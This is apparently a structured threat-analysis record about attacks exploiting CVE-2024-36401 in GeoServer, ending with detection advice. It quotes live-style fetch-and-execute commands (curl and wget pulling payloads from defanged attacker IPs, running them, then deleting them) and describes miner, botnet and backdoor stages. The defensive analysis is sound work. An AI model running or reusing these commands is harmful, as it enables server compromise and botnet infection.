package_info.package_manager: N/A (Java web application, exploited via OGC request parameters)
package_info.why_malicious: Attackers exploit a critical RCE vulnerability (CVE-2024-36401) in GeoServer to deliver and execute a variety of malware payloads, including backdoors, coin miners, and botnets, enabling remote control, persistence, and resource abuse on victim systems.

malicious_snippets.code_snippet: curl -o download_file hxxp://181[.]214[.]58[.]14:61231/remote.sh && chmod +x download_file && ./download_file && rm download_file
malicious_snippets.code_behavior: After successful RCE, the code downloads a platform-specific binary, executes it, and deletes the file to remove traces, establishing a reverse proxy connection to the attacker's C2.

malice_analysis.why_suspicious: Downloads and executes remote code, then deletes itself to evade detection.
malice_analysis.violated_expectations: Normal GeoServer operation should not download or execute arbitrary binaries from the internet.
malice_analysis.similar_legitimate_use: Automated update scripts (with trusted sources and signatures).

malicious_snippets.code_snippet: mkdir /tmp/<random>; decode libc.so.0, ld-uClibc.so.1, and next-stage payload with XOR 0xCC; store in /tmp/<random>; execute next-stage payload
malicious_snippets.code_behavior: After exploitation, the script creates a random directory, decodes and stores malicious libraries and payloads, then executes a backdoor (SideWalk) that decrypts config, establishes C2, and executes attacker commands.

malice_analysis.why_suspicious: Decoding and executing binaries from obfuscated payloads is a common evasion technique.
malice_analysis.violated_expectations: GeoServer should not create random directories in /tmp or execute unknown binaries.
malice_analysis.similar_legitimate_use: None in standard web server operation.

malicious_snippets.code_snippet: wget hxxp://188[.]214[.]27[.]50:4782/sky; chmod +x sky; ./sky geo; rm sky
malicious_snippets.code_behavior: Downloads and executes a Mirai variant botnet binary, which performs brute-force attacks and exploits router vulnerabilities, then deletes itself.

malice_analysis.why_suspicious: Automated download and execution of botnet malware, followed by self-deletion.
malice_analysis.violated_expectations: GeoServer should not participate in botnet activity or brute-force attacks.

malicious_snippets.code_behavior: Downloads and executes a DDoS botnet binary, which connects to C2, gathers host info, and waits for DDoS or remote command execution instructions.

malice_analysis.why_suspicious: Downloads and runs a binary with DDoS and backdoor capabilities.
malice_analysis.violated_expectations: GeoServer should not download or execute DDoS tools.

malicious_snippets.code_behavior: Downloads and executes a script that uninstalls cloud monitoring agents, kills security processes, checks for root, then downloads and persists a coin miner.

malice_analysis.why_suspicious: Disables security and monitoring, then installs a coin miner.
malice_analysis.violated_expectations: GeoServer should not interfere with cloud agents or install miners.

malicious_snippets.code_behavior: Decodes and executes a script that downloads a miner and config from attacker-controlled AWS, then runs XMRig with attacker-supplied config.

malice_analysis.why_suspicious: Obfuscated (base64) delivery and execution of mining malware.
malice_analysis.violated_expectations: GeoServer should not run obfuscated scripts or miners.

malicious_snippets.code_behavior: Downloads and executes a script that installs a coin miner, then removes files in /tmp, /var, /usr, and /opt to cover tracks.

malice_analysis.why_suspicious: Miner installation and anti-forensics file deletion.
malice_analysis.violated_expectations: GeoServer should not install miners or delete unrelated files.

malicious_snippets.code_behavior: Downloads and executes a script that sets up cron jobs to persistently download and run miner-related scripts, ensuring continued infection.

malice_analysis.why_suspicious: Persistence via cron and repeated miner installation.
malice_analysis.violated_expectations: GeoServer should not modify cron jobs or persist malware.

malicious_snippets.code_behavior: Miner configuration directs XMRig to connect to a Monero mining pool with attacker-controlled credentials, enabling unauthorized resource use and profit.

malice_analysis.why_suspicious: Hardcoded mining pool and wallet address for unauthorized cryptocurrency mining.
malice_analysis.violated_expectations: GeoServer should not participate in cryptocurrency mining.

attack_chain.action: Attacker exploits CVE-2024-36401 to achieve remote code execution on GeoServer.
attack_chain.leads_to: Ability to run arbitrary commands/scripts on the server

attack_chain.action: Malicious script is downloaded and executed, tailored to victim OS/architecture.
attack_chain.leads_to: Deployment of malware payloads (backdoors, miners, botnets)

attack_chain.action: Payload establishes persistence, disables security, and/or connects to C2 for further instructions.
attack_chain.leads_to: Long-term attacker control, resource abuse, or further lateral movement

attack_chain.action: Malware executes its primary function: mining cryptocurrency, launching DDoS, or acting as a backdoor.
attack_chain.leads_to: Attacker profit, service disruption, or data exfiltration

behavioral_signatures: Unexpected outbound connections to known mining pools or C2 infrastructure
Execution of shell scripts or binaries downloaded from untrusted remote URLs
Creation of persistence mechanisms (cron jobs, services) by web server processes
Disabling or uninstalling cloud monitoring/security agents
detection_knowledge.how_to_detect: Monitor for GeoServer processes executing shell commands or downloading files from untrusted external URLs. Flag creation of new binaries or scripts in /tmp or other non-standard locations, especially if followed by execution and deletion. Detect outbound connections to known mining pools, C2 servers, or suspicious IPs/domains. Alert on disabling or uninstalling security/cloud agents, and on the creation of new cron jobs or services by web server users. Use YARA rules for known miner/backdoor binaries and monitor for obfuscated (base64/XOR) script execution.
